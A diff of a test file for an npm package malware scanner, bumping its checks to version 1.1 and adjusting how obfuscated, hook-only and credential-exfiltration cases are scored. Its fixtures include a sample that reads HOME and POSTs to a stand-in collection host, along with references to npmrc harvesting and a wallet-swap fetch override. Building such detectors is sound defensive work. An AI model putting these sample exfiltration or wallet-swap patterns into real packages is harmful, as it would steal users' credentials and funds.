@@ -34,9 +34,9 @@ const ONE_REGEX_OVERRIDE = 'const evm = /0x[a-fA-F0-9]{40}/g;\nwindow.fetch = as
 const HOOKED = { name: 'p', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node install.js' } };
 const PLAIN = { name: 'p', version: '1.0.0', main: 'index.js' };
 
-test('T1 identity: static-checks-1.0, five checks with the proxy gate names and the §5 notice texts, limits equal to the walker\'s caps', async () => {
+test('T1 identity: static-checks-1.1 (declared: the 1.1 bump, cft015-s7), five checks with the proxy gate names and the §5 notice texts, limits equal to the walker\'s caps', async () => {
   const S = await SC();
-  assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.0');
+  assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.1');
   assert.deepEqual(S.CHECKS.map((c) => c.id), ['S0', 'S1', 'S2', 'S3', 'S4']);
   assert.deepEqual(S.CHECKS.map((c) => c.gate), ['static:S0-shell-fetch-in-hook', 'static:S1-loader-in-hook-target', 'static:S2-obfuscated-entry', 'static:S3-secret-harvest-with-sink', 'static:S4-wallet-swap-hook']);
   assert.deepEqual(S.CHECKS.map((c) => c.notice), ['an install script fetches and runs remote code', 'an install script runs a small loader that fetches and executes',
@@ -112,7 +112,9 @@ test('T5 S2 obfuscated-entry: ≥ 20 distinct _0x identifiers AND a decode marke
   assert.match(s2(HEX_OBF).detail, /decode marker \(hex-density\)/); assert.match(s2(CHARCODE_OBF).detail, /decode marker \(fromCharCode-run\)/);
   const binPj = { ...PLAIN, bin: { p: 'cli.js' } };
   assert.equal(row(S.staticRows({ manifest: binPj, packageJson: binPj, walk: walkOf([file('cli.js', OBF)]) }), 'S2').result, 'WARN', 'bin targets are entry files');
-  assert.equal(row(S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([file('install.js', OBF)]) }), 'S2').result, 'ALLOW', 'a hook target is not an entry file');
+  const hookOnly = row(S.staticRows({ manifest: HOOKED, packageJson: HOOKED, walk: walkOf([file('install.js', OBF)]) }), 'S2');
+  // declared, static-checks-1.1: no entry file was read, so the row is the nothing-read SKIP naming index.js (cft015-s7 N1), never a WARN
+  assert.equal(hookOnly.result, 'SKIP', 'a hook target is not an entry file'); assert.equal(hookOnly.detail, 'not checked: no eligible file in the tarball (index.js)');
 });
 
 test('T6 S3 secret-harvest-with-sink: a credential source AND an outbound sink to a non-registry host in one main, bin or hook file; the registry is not a sink', async () => {
@@ -120,7 +122,7 @@ test('T6 S3 secret-harvest-with-sink: a credential source AND an outbound sink t
   const s3 = (src, pj = PLAIN, p = 'index.js') => row(S.staticRows({ manifest: pj, packageJson: pj, walk: walkOf([file(p, src)]) }), 'S3');
   const a = s3(HARVEST); assert.equal(a.result, 'WARN'); assert.equal(a.detail, 'index.js (168 B) has a credential source (npmrc) and an outbound sink (exfil-host, post-to-literal-host)');
   assert.ok(!a.detail.includes('webhook.site'));
-  assert.match(s3(HARVEST_POST_HOST).detail, /credential source \(token-env\) and an outbound sink \(post-to-literal-host\)/);
+  assert.equal(s3(HARVEST_POST_HOST).result, 'ALLOW', 'declared, static-checks-1.1: the S3 sink is the exfil-host class only (cft015-s7 C3)');
   assert.equal(s3(CLI_REGISTRY).result, 'ALLOW'); assert.equal(s3('const h = process.env.HOME;\nfetch("https://collect.example.invalid/x", { method: "POST" });\n').result, 'ALLOW');
   assert.equal(s3(HARVEST, HOOKED, 'install.js').result, 'WARN', 'hook targets are read for S3');
 });
@@ -146,7 +148,7 @@ test('T8 conventions: a failed or unarmed walk is five "not checked" rows; binar
   const over = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([], [{ path: 'index.js', reason: 'over the kept-file cap (1048576 bytes)' }]) }), 'S2');
   assert.equal(over.result, 'SKIP'); assert.equal(over.detail, 'not checked: index.js over the kept-file cap (1048576 bytes)');
   const absent = row(S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([], [{ path: 'index.js', reason: 'not in the archive' }]) }), 'S2');
-  assert.equal(absent.result, 'SKIP'); assert.equal(absent.detail, 'not checked: index.js not in the archive');
+  assert.equal(absent.result, 'SKIP'); assert.equal(absent.detail, 'not checked: no eligible file in the tarball (index.js not in the archive)', 'declared, static-checks-1.1: nothing-read wording (cft015-s7 N1)');
   // the platform statement rides every row that read the file, WARN or ALLOW
   const plat = S.staticRows({ manifest: PLAIN, packageJson: PLAIN, walk: walkOf([file('index.js', OBF, { platformsNotChecked: ['macOS', 'Windows'] })]) });
   assert.match(row(plat, 'S2').detail, /decode marker \(eval\); not checked for macOS, Windows \(another entry installs there\)$/);
